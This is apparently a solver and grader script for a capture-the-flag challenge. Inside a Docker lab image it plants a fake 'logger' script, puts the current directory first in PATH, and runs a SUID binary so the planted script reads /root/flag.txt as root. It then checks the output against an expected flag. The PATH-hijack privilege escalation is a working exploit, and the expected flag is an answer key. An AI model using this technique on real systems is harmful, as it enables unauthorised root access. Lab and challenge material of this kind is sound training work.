#!/usr/bin/env bash
set -euo pipefail
IMG="ctf_ch10_suid"
out="$(docker run --rm -i "$IMG" bash -lc 'printf "#!/usr/bin/env bash\ncat /root/flag.txt > /tmp/out\n" > logger && chmod +x logger && PATH=.:$PATH ./vuln && cat /tmp/out')"
echo "Solver output: $out"
expected="flag{path_hijack_suid}"
[[ "$out" == "$expected" ]] && echo "Challenge 10: PASS" || (echo "Challenge 10: FAIL (expected $expected)" >&2; exit 1)
